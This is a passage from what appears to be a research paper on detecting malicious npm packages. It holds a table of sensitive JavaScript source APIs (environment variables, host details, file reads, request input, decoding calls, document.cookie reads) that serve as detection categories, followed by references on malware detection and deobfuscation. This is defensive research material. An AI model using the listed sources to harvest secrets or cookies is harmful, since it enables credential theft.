+Category APIs Env process.env , Bun.env , Deno.env , globalThis.env process.argv , Deno.args 
+
+Host os.userInfo() , os.homedir() , os.hostname() , os.networkInterfaces() , os.platform() , os.arch() os.release() , os.cpus() , os.tmpdir() , os.totalmem() , os.uptime() , plus Deno / navigator host information 
+
+Fs readFileSync , readFile , readdirSync , readdir , createReadStream , readlink , readlinkSync 
+
+Input req.body , req.query , req.params ; request.body , request.query , request.params ctx.body , ctx.query , ctx.params ; event.body , event.query , event.params 
+
+Encoding atob( x), btoa( x)Buffer.from( x, ’base64’) , Buffer.from( x, ’hex’) , Buffer.from( x, ’latin1’) , Buffer.from( x, ’binary’) 
+
+Browser document.cookie (read) 
+
+[6] Asger Feldthaus, Max Schäfer, Manu Sridharan, Julian Dolby, and Frank Tip. Efficient construction of ap-proximate call graphs for JavaScript IDE services. In 
+
+2013 35th International Conference on Software En-gineering (ICSE) , pages 752–761, May 2013. doi: 10.1109/ICSE.2013.6606621 .[7] Jeanne Ferrante, Karl J. Ottenstein, and Joe D. War-ren. The program dependence graph and its use in optimization. ACM Transactions on Programming Languages and Systems (TOPLAS) , 9(3):319–349, July 1987. doi:10.1145/24039.24041 .[8] Wenbo Guo, Zhongwen Chen, Zhengzi Xu, Chengwei Liu, Ming Kang, Shiwen Song, Chengyue Liu, Yijia Xu, Weisong Sun, and Yang Liu. Understanding NPM Mali-cious Package Detection: A Benchmark-Driven Empiri-16 cal Analysis. https://arxiv.org/abs/2603.27549v1, March 2026. [9] Keegan Hines, Gary Lopez, Matthew Hall, Federico Zarfati, Yonatan Zunger, and Emre Kiciman. Defend-ing Against Indirect Prompt Injection Attacks With Spotlighting, March 2024. arXiv:2403.14720 , doi: 10.48550/arXiv.2403.14720 .[10] Nicolas Hrubec and Jürgen Cito. Reducing Token Usage of State-in-Context Agents using Minification. In Pro-ceedings of the 2026 34th IEEE/ACM International Con-ference on Program Comprehension , ICPC ’26, pages 537–546, New York, NY, USA, July 2026. Association for Computing Machinery. doi:10.1145/3794763.37 98174 .[11] Cheng Huang, Nannan Wang, Ziyan Wang, Siqi Sun, Lingzi Li, Junren Chen, Qianchong Zhao, Jiaxuan Han, Zhen Yang, and Lei Shi. DONAPI: Malicious NPM Packages Detector using Behavior Sequence Knowl-edge Mapping. In 33rd USENIX Security Symposium (USENIX Security 24) , pages 3765–3782. USENIX As-sociation, 2024. [12] Yiheng Huang, Wen Zheng, Susheng Wu, Bihuan Chen, You Lu, Zhuotong Zhou, Yiheng Cao, Xiaoyu Li, and Xin Peng. ProfMal: Detecting Malicious NPM Packages by the Synergy between Static and Dynamic Analysis. In 2025 40th IEEE/ACM International Conference on Automated Software Engineering (ASE) , pages 419–431, November 2025. doi:10.1109/ASE63991.2025.0004 2.[13] HUMAN. HumanSecurity/restringer. HUMAN, August 2026. URL: https://github.com/HumanSecurity /restringer .[14] j4k0xb. J4k0xb/webcrack, August 2026. URL: https: //github.com/J4k0xb/Webcrack .[15] Simon Holm Jensen, Peter A. Jonsson, and Anders Møller. Remedying the eval that men do. In Proceed-ings of the 2012 International Symposium on Software Testing and Analysis , ISSTA 2012, pages 34–44, New York, NY, USA, July 2012. Association for Computing Machinery. doi:10.1145/2338965.2336758 .[16] Jimmy. JavaScript Obfuscator Online: JS Code Obfus-cator. https://codebeautify.org/javascript-obfuscator. [17] Xing Jin, Xunchao Hu, Kailiang Ying, Wenliang Du, Heng Yin, and Gautam Nagesh Peri. Code Injection At-tacks on HTML5-based Mobile Apps: Characterization, Detection and Mitigation. In Proceedings of the 2014 ACM SIGSAC Conference on Computer and Commu-nications Security , CCS ’14, pages 66–77, New York, NY, USA, November 2014. Association for Computing Machinery. doi:10.1145/2660267.2660275 .[18] Wittawat Jitkrittum, Harikrishna Narasimhan, Ankit Singh Rawat, Jeevesh Juneja, Congchao Wang, Zifeng Wang, Alec Go, Chen-Yu Lee, Pradeep Shenoy, Rina Panigrahy, Aditya Krishna Menon, and Sanjiv Kumar. Universal Model Routing for Efficient LLM Inference. In International Conference on Learning Representations , October 2025. [19] Piergiorgio Ladisa, Henrik Plate, Matias Martinez, and Olivier Barais. SoK: Taxonomy of Attacks on Open-Source Software Supply Chains. In 2023 IEEE Sympo-sium on Security and Privacy (SP) , pages 1509–1526, May 2023. doi:10.1109/SP46215.2023.10179304 .[20] Ningke Li, Shenao Wang, Mingxi Feng, Kailong Wang, Meizhen Wang, and Haoyu Wang. MalWuKong: To-wards Fast, Accurate, and Multilingual Detection of Ma-licious Code Poisoning in OSS Supply Chains. In 2023 38th IEEE/ACM International Conference on Automated Software Engineering (ASE) , pages 1993–2005, Septem-ber 2023. doi:10.1109/ASE56229.2023.00073 .[21] Yi Liu, Gelei Deng, Yuekang Li, Kailong Wang, Zihao Wang, Xiaofeng Wang, Tianwei Zhang, Yepang Liu, Haoyu Wang, Yan Zheng, Leo Yu Zhang, and Yang Liu. Prompt Injection attack against LLM-integrated Applications, December 2025. arXiv:2306.05499 ,
+
+doi:10.48550/arXiv.2306.05499 .[22] Marvin Moog, Markus Demmel, Michael Backes, and Aurore Fass. Statically Detecting JavaScript Obfusca-tion and Minification Techniques in the Wild. In 2021 51st Annual IEEE/IFIP International Conference on De-pendable Systems and Networks (DSN) , pages 569–580, June 2021. doi:10.1109/DSN48987.2021.00065 .[23] Andreas Moser, Christopher Kruegel, and Engin Kirda. Limits of Static Analysis for Malware Detection. In 
+
+Twenty-Third Annual Computer Security Applications Conference (ACSAC 2007) , pages 421–430. IEEE, 2007. [24] Dang-Khoa Nguyen, Gia-Thang Ho, Quang-Minh Pham, Tuyet A. Dang-Thi, Minh-Khanh Vu, Thanh-Cong Nguyen, Phat T. Tran-Truong, and Duc-Ly Vu. Taint-Based Code Slicing for LLMs-based Malicious NPM Package Detection, January 2026. arXiv:2512.12313 ,
+
+doi:10.48550/arXiv.2512.12313 .[25] Niels Groot Obbink, Ivano Malavolta, Gian Luca Scoc-cia, and Patricia Lago. An extensible approach for tam-ing the challenges of JavaScript dead code elimination. 
+
+2018 IEEE 25th International Conference on Software Analysis, Evolution and Reengineering (SANER) , pages 402–412, 2018. doi:10.1109/SANER.2018.8330226 .17 [26] OpenAI. Tokenizer - OpenAI API. https://platform.openai.com/tokenizer. [27] OSV. OSV - Open Source Vulnerabilities. https://osv.dev/. [28] Jeremy Rack and Cristian-Alexandru Staicu. Jack-in-the-box: An Empirical Study of JavaScript Bundling on the Web and its Security Implications. In Proceedings of the 2023 ACM SIGSAC Conference on Computer and Communications Security , CCS ’23, pages 3198–3212, New York, NY, USA, November 2023. Association for Computing Machinery. doi:10.1145/3576915.3623 140 .[29] Surya Rao Rayarao and Naga Donikena. The shai-hulud NPM supply chain attack: A comprehensive analysis of self-replicating malware in the JavaScript ecosystem. 
+
+Authorea , 2025. doi:10.22541/au.175830854.4275 0868/v1 .[30] Gregor Richards, Christian Hammer, Brian Burg, and Jan Vitek. The eval that men do: A large-scale study of the use of eval in javascript applications. In Proceedings of the 25th European Conference on Object-oriented Programming , ECOOP’11, pages 52–78, Berlin, Heidel-berg, July 2011. Springer-Verlag. [31] Gregor Richards, Sylvain Lebresne, Brian Burg, and Jan Vitek. An analysis of the dynamic behavior of JavaScript programs. ACM SIGPLAN Notices , 45(6):1–12, June 2010. doi:10.1145/1809028.1806598 .[32] Rohan Prabhu. The Hades Campaign: Graph ML PyPI Packages Deploy Cross-Platform Memory Scrapers, AI Analyst Misdirection, and a Wiper De-terrent. https://www.stepsecurity.io/blog/the-hades-campaign-pypi-packages. [33] shacharm. Shai-Hulud npm supply chain attack - new compromised packages detected, November 2025. URL: 
+
+https://jfrog.com/blog/shai-hulud-npm-suppl y-chain-attack-new-compromised-packages-det ected/ .[34] Philippe Skolka, Cristian-Alexandru Staicu, and Michael Pradel. Anything to Hide? Studying Minified and Obfuscated Code in the Web. In The World Wide Web Conference , WWW ’19, pages 1735–1746, New York, NY, USA, May 2019. Association for Computing Machinery. doi:10.1145/3308558.3313752 .[35] Yuta Takata, Mitsuaki Akiyama, Takeshi Yagi, Takeo Hariu, and Shigeki Goto. MineSpider: Extracting Hid-den URLs Behind Evasive Drive-by Download At-tacks. IEICE Transactions on Information and Systems ,E99.D(4):860–872, 2016. doi:10.1587/transinf.2 015ICP0013 .[36] Frank Tip. A Survey of Program Slicing Techniques. Technical Report, CWI (Centre for Mathematics and Computer Science), NLD, June 1994. [37] Ellen Wang and Christophe Tafani-Dereeper. DataDog/-guarddog. Datadog, Inc., June 2026. URL: https: //github.com/DataDog/guarddog .[38] Yongshan Wang, Siyuan Pang, Zijing Fan, Shang Shang, Yepeng Yao, Zhengwei Jiang, and Baoxu Liu. Advanced code slicing with pre-trained model fine-tuned for open-source component malware detection. The Computer Journal , 68(9):1163–1180, September 2025. doi:10.1 093/comjnl/bxaf029 .[39] Mark Weiser. Program slicing. In Proceedings of the 5th International Conference on Software Engineering ,ICSE ’81, pages 439–449, San Diego, California, USA, March 1981. IEEE Press. [40] Elizabeth Wyss, Dominic Tassio, Lorenzo De Carli, and Drew Davidson. Evaluating LLM-based detec-tion of malicious package updates in npm. In 28th International Symposium on Research in Attacks, In-trusions and Defenses, RAID 2025, Gold Coast, Aus-tralia, October 19-22, 2025 , pages 678–692. IEEE, 2025. 
+
+doi:10.1109/RAID67961.2025.00047 .[41] Wenyuan Xu, Alexi Turcotte, and Cristian-Alexandru Staicu. D-BUNDLR: Destructing JavaScript Bundles for Effective Static Analysis. In Proceedings of the 2026 IEEE/ACM 48th International Conference on Software Engineering , pages 3449–3461, Rio de Janeiro Brazil, April 2026. ACM. doi:10.1145/3744916.3764564 .[42] Nusrat Zahan, Philipp Burckhardt, Mikola Lysenko, Fer-oss Aboukhadijeh, and Laurie Williams. Leveraging Large Language Models to Detect npm Malicious Pack-ages. In Proceedings of the IEEE/ACM 47th Interna-tional Conference on Software Engineering , ICSE ’25, pages 2625–2637, Ottawa, Ontario, Canada, September 2025. IEEE Press. doi:10.1109/ICSE55347.2025.0 0146 .[43] Jian Zhao, Shenao Wang, Qingyang Wu, Yanjie Zhao, Xiao Cheng, and Haoyu Wang. MalTotal: Cost-effective and language-agnostic malicious code poisoning detec-tion for millions of repositories. Proceedings of the ACM on Software Engineering , 3(ISSTA), October 2026. 
+
+doi:10.1145/3832228 .[44] Xinyi Zheng, Chen Wei, Shenao Wang, Yanjie Zhao, Peiming Gao, Yuanchao Zhang, Kailong Wang, and Haoyu Wang. Towards Robust Detection of Open Source Software Supply Chain Poisoning Attacks in Industry Environments. In Proceedings of the 39th 
+
+18 IEEE/ACM International Conference on Automated Soft-ware Engineering , ASE ’24, pages 1990–2001, New York, NY, USA, October 2024. Association for Comput-ing Machinery. doi:10.1145/3691620.3695262 .[45] Dongchao Zhou, Lingyun Ying, Huajun Chai, and Dong-bin Wang. From Obfuscated to Obvious: A Comprehen-sive JavaScript Deobfuscation Tool for Security Analy-sis. In Proceedings 2026 Network and Distributed Sys-tem Security Symposium , San Diego, CA, USA, 2026. Internet Society. doi:10.14722/ndss.2026.242198 .19
